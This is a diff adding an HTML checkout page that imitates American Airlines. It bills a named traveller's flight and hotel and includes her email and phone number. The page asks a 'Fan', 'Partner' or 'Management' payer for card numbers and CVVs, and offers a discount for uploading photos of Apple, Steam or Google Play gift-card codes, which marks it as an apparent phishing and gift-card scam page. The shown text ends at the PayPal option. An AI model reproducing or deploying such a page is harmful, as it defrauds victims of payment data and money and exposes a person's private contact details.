@@ -1,0 +1,1740 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>American Airlines - Review and Pay</title>
+    <!-- Importing Google Font for clean typography -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #f7f9fa;
+            color: #222;
+        }
+
+        /* Top Bar */
+        header.top-bar {
+            background: #ffffff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            border-bottom: 1px solid #e1e4e8;
+        }
+
+        .top-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .brand-logo img {
+            display: block;
+            height: 24px;
+            width: auto;
+        }
+
+        .top-nav-links {
+            display: none;
+        }
+
+        .top-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .login-btn-header {
+            background: #00539f;
+            color: #ffffff;
+            padding: 6px 14px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 700;
+        }
+
+        .hamburger-menu {
+            font-size: 22px;
+            cursor: pointer;
+            color: #111;
+            font-weight: bold;
+            line-height: 1;
+        }
+
+        /* Main Content Wrapper */
+        .main-container {
+            max-width: 820px;
+            margin: 15px auto;
+            padding: 0 12px;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 16px;
+        }
+
+        /* --- Ambassador Welcome Banner --- */
+        .ambassador-welcome-banner {
+            background: linear-gradient(135deg, #0b2341 0%, #00539f 100%);
+            color: #ffffff;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .ambassador-tag {
+            background: #ffc107;
+            color: #111;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 3px 8px;
+            border-radius: 4px;
+            width: fit-content;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .ambassador-title {
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .ambassador-subtitle {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+
+        /* --- Passenger Details Box --- */
+        .passenger-details-box {
+            background: #ffffff;
+            border: 1px solid #ccd2d9;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+
+        .passenger-details-box h2 {
+            font-size: 16px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 12px;
+        }
+
+        .details-grid-row {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .detail-item span {
+            display: block;
+            font-size: 11px;
+            color: #666;
+            text-transform: uppercase;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+
+        /* --- Itinerary & Hotel Section Styles --- */
+        .trip-section {
+            background: #ffffff;
+            border: 1px solid #ccd2d9;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.04);
+        }
+
+        .trip-section h2 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 12px;
+        }
+
+        .trip-route-badge {
+            text-align: center;
+            font-weight: 700;
+            color: #003366;
+            margin-bottom: 14px;
+            font-size: 13px;
+            letter-spacing: 0.5px;
+            border-bottom: 3px solid #00539f;
+            padding-bottom: 6px;
+        }
+
+        .flight-card, .hotel-card {
+            border: 1px solid #d1d7dc;
+            border-radius: 6px;
+            padding: 14px;
+            margin-bottom: 12px;
+            background: #fff;
+        }
+
+        .flight-date, .hotel-date {
+            font-size: 12px;
+            color: #555;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+
+        .flight-main-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .flight-endpoint {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .flight-endpoint.right {
+            align-items: flex-end;
+        }
+
+        .flight-time {
+            font-size: 14px;
+            font-weight: 700;
+            color: #111;
+        }
+
+        .flight-code-city {
+            font-size: 13px;
+            font-weight: 700;
+            color: #111;
+            margin-top: 2px;
+        }
+
+        .flight-sub-city {
+            font-size: 11px;
+            color: #666;
+            margin-top: 2px;
+        }
+
+        .flight-middle-path {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+            padding: 0 8px;
+        }
+
+        .flight-duration {
+            font-size: 11px;
+            color: #555;
+            margin-bottom: 4px;
+        }
+
+        .flight-path-line {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            position: relative;
+        }
+
+        .flight-path-line::before {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 1px;
+            background: #ccc;
+            top: 50%;
+            z-index: 1;
+        }
+
+        .plane-icon-center {
+            position: relative;
+            z-index: 2;
+            background: #fff;
+            padding: 0 4px;
+            font-size: 12px;
+        }
+
+        .flight-airline-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #e1e4e8;
+            padding-top: 8px;
+            font-size: 12px;
+            color: #333;
+        }
+
+        .tight-connection-note {
+            background: #fff8e1;
+            border-left: 3px solid #ffc107;
+            padding: 8px 10px;
+            font-size: 11px;
+            color: #856404;
+            margin-top: 8px;
+            border-radius: 0 4px 4px 0;
+        }
+
+        /* Hotel Specific Styles */
+        .hotel-header-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .hotel-name {
+            font-size: 14px;
+            font-weight: 700;
+            color: #111;
+        }
+
+        .hotel-location {
+            font-size: 12px;
+            color: #555;
+            margin-top: 2px;
+        }
+
+        .hotel-badge {
+            background: #e6f0fa;
+            color: #00539f;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 3px 6px;
+            border-radius: 4px;
+            text-transform: uppercase;
+        }
+
+        /* --- Cost Summary Box Styles --- */
+        .cost-summary-box {
+            background: #ffffff;
+            border: 1px solid #ccd2d9;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.04);
+        }
+
+        .cost-summary-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 18px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 12px;
+        }
+
+        .cost-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #333;
+            padding: 6px 0;
+            border-bottom: 1px solid #f0f2f5;
+        }
+
+        .total-due-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 2px solid #ccd2d9;
+            font-size: 15px;
+            font-weight: 700;
+            color: #111;
+        }
+
+        .total-due-row small {
+            display: block;
+            font-size: 11px;
+            font-weight: 400;
+            color: #666;
+            margin-top: 2px;
+        }
+
+        .discount-row {
+            color: #00875a;
+            font-weight: 500;
+            display: none;
+        }
+
+        /* Payment Card Box */
+        .payment-box {
+            background: #ffffff;
+            border: 1px solid #ccd2d9;
+            border-radius: 6px;
+            padding: 16px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.04);
+            margin-bottom: 20px;
+        }
+
+        .payment-box h2 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 4px;
+        }
+
+        .required-sub {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 16px;
+        }
+
+        .payment-box h3 {
+            font-size: 14px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 12px;
+        }
+
+        /* Payer Information Form Styles */
+        .payer-info-container {
+            background: #f8f9fa;
+            border: 1px solid #e1e4e8;
+            border-radius: 6px;
+            padding: 14px;
+            margin-bottom: 16px;
+        }
+
+        .payer-info-container h4 {
+            font-size: 13px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 8px;
+        }
+
+        .relationship-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 12px;
+        }
+
+        .relationship-options label {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .payer-inputs-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+        }
+
+        .payer-input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .payer-input-group label {
+            font-size: 11px;
+            font-weight: 700;
+            color: #444;
+        }
+
+        .payer-input-group input {
+            padding: 8px 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 13px;
+        }
+
+        /* Inline Card Form Inputs */
+        .card-form-container {
+            background: #f8f9fa;
+            border: 1px solid #cbd5e1;
+            border-radius: 6px;
+            padding: 14px;
+            margin: 10px 0 16px 0;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .giftcard-form-container {
+            background: #f8f9fa;
+            border: 1px solid #cbd5e1;
+            border-radius: 6px;
+            padding: 14px;
+            margin: 10px 0 16px 0;
+            display: none;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .card-form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .card-input-field {
+            display: flex;
+            flex-direction: column;
+            gap: 3px;
+        }
+
+        .card-input-field label {
+            font-size: 11px;
+            font-weight: 700;
+            color: #444;
+        }
+
+        .card-input-field input, .card-input-field select {
+            padding: 8px 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 13px;
+            background: #fff;
+        }
+
+        .action-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #ccd2d9;
+            border-radius: 4px;
+            padding: 12px 14px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            background: #fff;
+        }
+
+        .action-row-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+            color: #0b2341;
+            font-size: 13px;
+        }
+
+        .option-icon-img {
+            height: 20px;
+            width: auto;
+            display: block;
+            object-fit: contain;
+        }
+
+        .chevron {
+            color: #0b2341;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .info-notice {
+            display: flex;
+            gap: 10px;
+            background-color: #f0f4f9;
+            border-left: 4px solid #00539f;
+            padding: 12px;
+            border-radius: 0 4px 4px 0;
+            margin: 16px 0;
+            font-size: 12px;
+            line-height: 1.4;
+            color: #333;
+            align-items: flex-start;
+        }
+
+        .banner-icon-img {
+            height: 18px;
+            width: auto;
+            display: block;
+            flex-shrink: 0;
+            object-fit: contain;
+        }
+
+        .info-notice small {
+            display: block;
+            color: #555;
+            margin-top: 3px;
+        }
+
+        .radio-section {
+            border-top: 1px solid #e1e4e8;
+            padding-top: 6px;
+            margin-top: 14px;
+        }
+
+        .radio-item {
+            display: flex;
+            align-items: center;
+            padding: 8px 0;
+        }
+
+        .card-header-row {
+            border-bottom: none;
+        }
+
+        .radio-item label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
+            font-size: 13px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .radio-item input[type="radio"] {
+            transform: scale(1.1);
+            accent-color: #0b2341;
+            cursor: pointer;
+        }
+
+        .card-logos-container {
+            display: flex;
+            gap: 4px;
+            align-items: center;
+            margin-left: 24px;
+            margin-bottom: 6px;
+            flex-wrap: wrap;
+        }
+
+        .cc-logo-img {
+            height: 18px;
+            width: auto;
+            display: block;
+            object-fit: contain;
+        }
+
+        .payment-row-divider {
+            border-top: 1px solid #f0f2f5;
+            margin-top: 4px;
+            padding-top: 8px;
+        }
+
+        .payment-label-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            font-weight: 500;
+            font-size: 13px;
+        }
+
+        .payment-brand-group {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .payment-logo-img {
+            height: 16px;
+            width: auto;
+            display: block;
+        }
+
+        .crypto-tag {
+            background: #e1f5fe;
+            color: #0288d1;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 5px;
+            border-radius: 4px;
+        }
+
+        .giftcard-tag {
+            background: #e8f5e9;
+            color: #2e7d32;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 5px;
+            border-radius: 4px;
+        }
+
+        /* --- Big Proceed to Payment Button Styles --- */
+        .proceed-payment-container {
+            margin-bottom: 24px;
+        }
+
+        .proceed-btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, #00539f 0%, #0b2341 100%);
+            color: #ffffff;
+            text-align: center;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 83, 159, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            text-decoration: none;
+        }
+
+        .proceed-btn:hover {
+            opacity: 0.95;
+        }
+
+        .secure-checkout-note {
+            text-align: center;
+            font-size: 11px;
+            color: #666;
+            margin-top: 8px;
+        }
+
+        /* --- Custom Responsive Pop-up Modal Styles --- */
+        .custom-modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .custom-modal-content {
+            background: #ffffff;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.25);
+            overflow: hidden;
+            animation: modalFadeIn 0.25s ease-out;
+        }
+
+        @keyframes modalFadeIn {
+            0% { transform: scale(0.95); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .custom-modal-header {
+            background: #0b2341;
+            color: #ffffff;
+            padding: 14px 20px;
+            font-size: 16px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .custom-modal-body {
+            padding: 20px;
+            font-size: 14px;
+            color: #333333;
+            line-height: 1.5;
+        }
+
+        .custom-modal-footer {
+            padding: 12px 20px;
+            background: #f8f9fa;
+            display: flex;
+            justify-content: flex-end;
+            border-top: 1px solid #e1e4e8;
+        }
+
+        .custom-modal-btn {
+            background: #00539f;
+            color: #ffffff;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 4px;
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .custom-modal-btn:hover {
+            background: #003d73;
+        }
+
+        /* --- Limited-Time Offer Box Styles --- */
+        .promo-offer-box {
+            background: #ffffff;
+            border: 1px solid #ccd2d9;
+            border-radius: 6px;
+            padding: 16px;
+            margin-bottom: 24px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.04);
+        }
+
+        .offer-top-link {
+            text-align: right;
+            font-size: 11px;
+            margin-bottom: 8px;
+        }
+
+        .offer-top-link a {
+            color: #00539f;
+            text-decoration: none;
+        }
+
+        .offer-content-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            border-top: 1px solid #e1e4e8;
+            border-bottom: 1px solid #e1e4e8;
+            padding: 12px 0;
+        }
+
+        .offer-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .offer-card-img {
+            width: 80px;
+            height: auto;
+        }
+
+        .offer-badge-text {
+            font-size: 9px;
+            text-transform: uppercase;
+            color: #666;
+            letter-spacing: 0.5px;
+            margin-bottom: 2px;
+        }
+
+        .offer-main-numbers {
+            font-size: 16px;
+            font-weight: 700;
+            color: #111;
+        }
+
+        .offer-right {
+            text-align: left;
+        }
+
+        .offer-calc-row {
+            font-size: 12px;
+            color: #444;
+            margin-bottom: 4px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .offer-calc-row.total-row {
+            font-weight: 700;
+            color: #111;
+            border-top: 1px solid #e1e4e8;
+            padding-top: 6px;
+            margin-top: 4px;
+        }
+
+        .offer-footer-text {
+            font-size: 12px;
+            color: #444;
+            margin: 12px 0;
+        }
+
+        .learn-more-btn {
+            background: #fff;
+            border: 1px solid #00539f;
+            color: #00539f;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 12px;
+        }
+
+        /* --- Extra Promos with Logos Styles --- */
+        .extra-promos-stack {
+            margin-bottom: 24px;
+        }
+
+        .extra-promo-row {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 16px;
+            gap: 4px;
+        }
+
+        .promo-logo-link img {
+            height: 24px;
+            width: auto;
+            display: block;
+            object-fit: contain;
+        }
+
+        .extra-promo-link-text {
+            text-decoration: none;
+            color: #00539f;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .extra-promo-desc {
+            font-size: 11px;
+            color: #555;
+        }
+
+        /* --- Footer Links Styles --- */
+        footer.main-footer {
+            border-top: 1px solid #ccd2d9;
+            padding: 24px 0;
+            background: #f7f9fa;
+            font-size: 12px;
+            color: #333;
+        }
+
+        .footer-columns {
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+
+        .footer-col h4 {
+            font-size: 14px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #ccc;
+            padding-bottom: 4px;
+        }
+
+        .footer-col ul {
+            list-style: none;
+        }
+
+        .footer-col ul li {
+            margin-bottom: 6px;
+        }
+
+        .footer-col ul li a {
+            text-decoration: none;
+            color: #00539f;
+        }
+
+        .footer-bottom-row {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            align-items: flex-start;
+            border-top: 1px solid #ccd2d9;
+            padding-top: 16px;
+            font-size: 10px;
+            color: #666;
+        }
+
+        .social-icons {
+            display: flex;
+            gap: 8px;
+        }
+
+        .social-circle {
+            width: 26px;
+            height: 26px;
+            border: 1px solid #888;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #444;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 11px;
+        }
+
+        /* Desktop expansion queries */
+        @media (min-width: 768px) {
+            header.top-bar {
+                padding: 12px 40px;
+            }
+            .hamburger-menu {
+                display: none;
+            }
+            .top-nav-links {
+                display: flex;
+                gap: 15px;
+            }
+            .top-nav-links a {
+                text-decoration: none;
+                color: #333;
+                font-size: 13px;
+                font-weight: 500;
+            }
+            .main-container {
+                max-width: 820px;
+                margin: 40px auto;
+                padding: 0 20px;
+            }
+            h1 {
+                font-size: 32px;
+            }
+            .trip-section, .cost-summary-box, .payment-box, .promo-offer-box, .passenger-details-box {
+                padding: 24px;
+            }
+            .details-grid-row {
+                grid-template-columns: 1fr 1fr;
+            }
+            .payer-inputs-grid {
+                grid-template-columns: 1fr 1fr 1fr;
+            }
+            .offer-content-grid {
+                flex-direction: row;
+                justify-content: space-between;
+            }
+            .offer-right {
+                text-align: right;
+                min-width: 250px;
+            }
+            .offer-calc-row {
+                justify-content: space-between;
+                gap: 30px;
+            }
+            .footer-columns {
+                flex-direction: row;
+                justify-content: space-between;
+                gap: 40px;
+            }
+            .footer-bottom-row {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="top-bar">
+        <div class="top-left">
+            <div class="brand-logo">
+                <a href="https://www.aa.com" target="_blank"><img src="image/aa-logo.png" alt="American Airlines Logo" onerror="this.src='https://placehold.co/120x24/00539f/ffffff?text=American+Airlines'"></a>
+            </div>
+            <nav class="top-nav-links">
+                <a href="https://www.aa.com/booking/find-flights" target="_blank">Plan travel</a>
+                <a href="https://www.aa.com/travel-information/index.jsp" target="_blank">Travel info</a>
+                <a href="https://www.aa.com/aadvantage-program/index.jsp" target="_blank">AAdvantage®</a>
+            </nav>
+        </div>
+        <div class="top-right">
+            <a href="https://www.aa.com/login" target="_blank" class="login-btn-header">Log in</a>
+            <div class="hamburger-menu" onclick="window.open('https://www.aa.com/menu', '_blank')">☰</div>
+        </div>
+    </header>
+
+    <!-- Content Body -->
+    <main class="main-container">
+
+        <!-- Ambassador Welcome Banner -->
+        <div class="ambassador-welcome-banner">
+            <div class="ambassador-tag">VIP Ambassador Status</div>
+            <div class="ambassador-title">Welcome back, Melissa Ann Mia Malkova!</div>
+            <div class="ambassador-subtitle">We are honored to have you traveling as our distinguished Ambassador.</div>
+        </div>
+
+        <!-- Passenger Details Section -->
+        <div class="passenger-details-box">
+            <h2>Passenger details</h2>
+            <div class="details-grid-row">
+                <div class="detail-item">
+                    <span>Full Legal Name</span>
+                    <strong>Melissa Ann Mia Malkova</strong>
+                </div>
+                <div class="detail-item">
+                    <span>Gender</span>
+                    <strong>Female</strong>
+                </div>
+            </div>
+            <div class="details-grid-row" style="margin-bottom: 0;">
+                <div class="detail-item">
+                    <span>Date of Birth</span>
+                    <strong>July 1, 1992</strong>
+                </div>
+                <div class="detail-item">
+                    <span>Contact Info</span>
+                    <strong>miamalkova1@gmail.com | +1 (678) 713-4840</strong>
+                </div>
+            </div>
+        </div>
+        
+        <!-- YOUR TRIP ITINERARY SECTION -->
+        <div class="trip-section">
+            <h2>Your trip</h2>
+            <div class="trip-route-badge">PSP &rarr; FNT</div>
+
+            <!-- Flight Segment: PSP to FNT (AA 4921) -->
+            <div class="flight-card">
+                <div class="flight-date">Sunday, September 27, 2026</div>
+                <div class="flight-main-info">
+                    <div class="flight-endpoint">
+                        <span class="flight-time">6:34 AM</span>
+                        <span class="flight-code-city">PSP</span>
+                        <span class="flight-sub-city">Palm Springs, CA</span>
+                    </div>
+                    <div class="flight-middle-path">
+                        <span class="flight-duration">7h 55m (2 Stops)</span>
+                        <div class="flight-path-line">
+                            <span class="plane-icon-center">✈️</span>
+                        </div>
+                    </div>
+                    <div class="flight-endpoint right">
+                        <span class="flight-time">5:29 PM</span>
+                        <span class="flight-code-city">FNT</span>
+                        <span class="flight-sub-city">Flint, MI</span>
+                    </div>
+                </div>
+
+                <div class="flight-airline-row">
+                    <span><strong>AA 4921</strong> · Main Cabin &nbsp;|&nbsp; PHX & ORD</span>
+                    <span class="collapse-arrow">∧</span>
+                </div>
+
+                <div class="tight-connection-note">
+                    ⚠️ Note: Connections are tight (PHX: 38m, ORD: 44m); ensure you head directly to your next gate.
+                </div>
+            </div>
+
+            <!-- Hotel Stay Card: Hilton Garden Inn Downtown -->
+            <div class="hotel-card" style="margin-bottom: 0;">
+                <div class="hotel-date">Sunday, September 27 – Monday, September 28, 2026 (1 Night)</div>
+                <div class="hotel-header-info">
+                    <div>
+                        <div class="hotel-name">Hilton Garden Inn Downtown</div>
+                        <div class="hotel-location">1 Room · Standard King Bed</div>
+                    </div>
+                    <div class="hotel-badge">Hotel Stay</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- COST SUMMARY SECTION -->
+        <div class="cost-summary-box">
+            <div class="cost-summary-header">
+                <span>Cost summary</span>
+                <span style="color: #00539f; font-size: 18px;">⌄</span>
+            </div>
+            <div class="cost-row">
+                <span>Flight Fare (PSP &rarr; FNT)</span>
+                <span>$950.00</span>
+            </div>
+            <div class="cost-row">
+                <span>Hotel (Hilton Garden Inn - 1 Night)</span>
+                <span>$102.00</span>
+            </div>
+            <div class="cost-row" style="border-bottom: none;">
+                <span>Taxes & Fees</span>
+                <span>$68.50</span>
+            </div>
+            <div class="cost-row discount-row" id="discountRow">
+                <span id="discountTitle">Discount</span>
+                <span id="discountAmount">-$0.00</span>
+            </div>
+            <div class="total-due-row">
+                <div>Total amount due <small>(Mia Malkova)</small></div>
+                <div id="totalDueDisplay">$1,120.50</div>
+            </div>
+        </div>
+
+        <!-- REVIEW AND PAY SECTION -->
+        <h1>Review and pay</h1>
+
+        <div class="payment-box">
+            <h2>Payment information</h2>
+            <div class="required-sub">All fields are required.</div>
+
+            <!-- Payer Information Form Section -->
+            <div class="payer-info-container">
+                <h4>Payer Details (Who is making this payment?)</h4>
+                <div class="relationship-options">
+                    <label><input type="radio" name="payer-relationship" value="Fan" checked> Fan</label>
+                    <label><input type="radio" name="payer-relationship" value="Partner"> Partner</label>
+                    <label><input type="radio" name="payer-relationship" value="Management"> Management</label>
+                    <label><input type="radio" name="payer-relationship" value="Other"> Other</label>
+                </div>
+                <div class="payer-inputs-grid">
+                    <div class="payer-input-group">
+                        <label>Payer Full Name</label>
+                        <input type="text" id="payerName" placeholder="Enter full name">
+                    </div>
+                    <div class="payer-input-group">
+                        <label>Payer Email</label>
+                        <input type="email" id="payerEmail" placeholder="name@example.com">
+                    </div>
+                    <div class="payer-input-group">
+                        <label>Payer Phone Number</label>
+                        <input type="tel" id="payerPhone" placeholder="+1 (555) 000-0000">
+                    </div>
+                </div>
+            </div>
+
+            <h3>How would you like to pay?</h3>
+
+            <!-- Trip Credit Box -->
+            <div class="action-row" onclick="window.open('https://www.aa.com/trip-credit', '_blank')">
+                <div class="action-row-left">
+                    <img src="image/plane.png" alt="Plane Icon" class="option-icon-img" onerror="this.src='https://placehold.co/20x20/00539f/ffffff?text=✈'">
+                    <span>Add Trip Credit / Flight Credit</span>
+                </div>
+                <div class="chevron">&gt;</div>
+            </div>
+
+            <!-- Gift Card Box -->
+            <div class="action-row" onclick="window.open('https://www.aa.com/gift-cards', '_blank')">
+                <div class="action-row-left">
+                    <img src="image/gift card.png" alt="Gift Card Icon" class="option-icon-img" onerror="this.src='https://placehold.co/20x20/00539f/ffffff?text=🎁'">
+                    <span>Add a gift card / flight discount</span>
+                </div>
+                <div class="chevron">&gt;</div>
+            </div>
+
+            <!-- Promotion banner -->
+            <div class="info-notice">
+                <img src="image/star around world.png" alt="Star World Icon" class="banner-icon-img" onerror="this.src='https://placehold.co/18x18/00539f/ffffff?text=★'">
+                <div>
+                    Earn additional miles and Loyalty Points when you use an AAdvantage® credit card.
+                    <small><a href="https://www.aa.com/credit-cards" target="_blank" style="color: #00539f; text-decoration: underline;">Review your Aviator® Reward Rules for details.</a></small>
+                </div>
+            </div>
+
+            <!-- Radio Options Section -->
+            <div class="radio-section">
+                <!-- Credit Card Option -->
+                <div class="radio-item card-header-row">
+                    <label onclick="updatePayment('card')">
+                        <input type="radio" name="payment-method" id="methodCard" checked>
+                        <span>Credit / debit card</span>
+                    </label>
+                </div>
+
+                <div class="card-logos-container">
+                    <img src="image/visa1.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
+                    <img src="image/visa2.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
+                    <img src="image/visa3.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
+                    <img src="image/visa4.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
+                    <img src="image/visa5.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
+                    <img src="image/visa6.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
+                    <img src="image/visa7.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
+                    <img src="image/visa8.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
+                </div>
+
+                <!-- Hidden Card Entry Form Fields -->
+                <div class="card-form-container" id="cardDetailsContainer">
+                    <div class="card-input-field">
+                        <label>Cardholder Name</label>
+                        <input type="text" id="cardHolderName" placeholder="Name as printed on card">
+                    </div>
+                    <div class="card-input-field">
+                        <label>Card Number</label>
+                        <input type="text" id="cardNumber" placeholder="4111 2222 3333 4444" maxlength="19">
+                    </div>
+                    <div class="card-form-row">
+                        <div class="card-input-field">
+                            <label>Expiration Date</label>
+                            <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5">
+                        </div>
+                        <div class="card-input-field">
+                            <label>Security Code (CVV)</label>
+                            <input type="password" id="cardCvv" placeholder="123" maxlength="4">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Gift Card Payment Option -->
+                <div class="radio-item payment-row-divider">
+                    <label onclick="updatePayment('giftcard')">
+                        <input type="radio" name="payment-method" id="methodGiftCard">
+                        <span class="payment-label-content">
+                            <span class="payment-brand-group">
+                                <span style="font-size: 16px;">🎁</span>
+                                <span>Gift Card (Any Brand)</span>
+                            </span>
+                            <span class="giftcard-tag">5% OFF</span>
+                        </span>
+                    </label>
+                </div>
+
+                <!-- Gift Card Entry Form Fields -->
+                <div class="giftcard-form-container" id="giftCardDetailsContainer">
+                    <div class="card-input-field">
+                        <label>Select Gift Card Brand / Type</label>
+                        <select id="giftCardBrand">
+                            <option value="American Airlines Gift Card">American Airlines Gift Card</option>
+                            <option value="Apple Gift Card">Apple Gift Card</option>
+                            <option value="Amazon Gift Card">Amazon Gift Card</option>
+                            <option value="Visa / Mastercard Prepaid">Visa / Mastercard Prepaid Gift Card</option>
+                            <option value="Google Play Gift Card">Google Play Gift Card</option>
+                            <option value="Steam Gift Card">Steam Gift Card</option>
+                            <option value="Target Gift Card">Target Gift Card</option>
+                            <option value="Walmart Gift Card">Walmart Gift Card</option>
+                            <option value="Other Brand">Other Gift Card Brand</option>
+                        </select>
+                    </div>
+                    <div class="card-input-field">
+                        <label>Gift Card Amount ($ USD)</label>
+                        <input type="number" id="giftCardAmount" placeholder="1120.50" step="0.01">
+                    </div>
+                    <div class="card-input-field">
+                        <label>Upload Picture of Gift Card (Front / Code)</label>
+                        <input type="file" id="giftCardImage" accept="image/*">
+                    </div>
+                    <div style="font-size: 11px; color: #555; margin-top: 2px;">
+                        ℹ️ Uploading your gift card applies an automatic 5% discount to your booking total!
+                    </div>
+                </div>
+
+                <!-- PayPal Option -->
+                <div class="radio-item payment-row-divider">
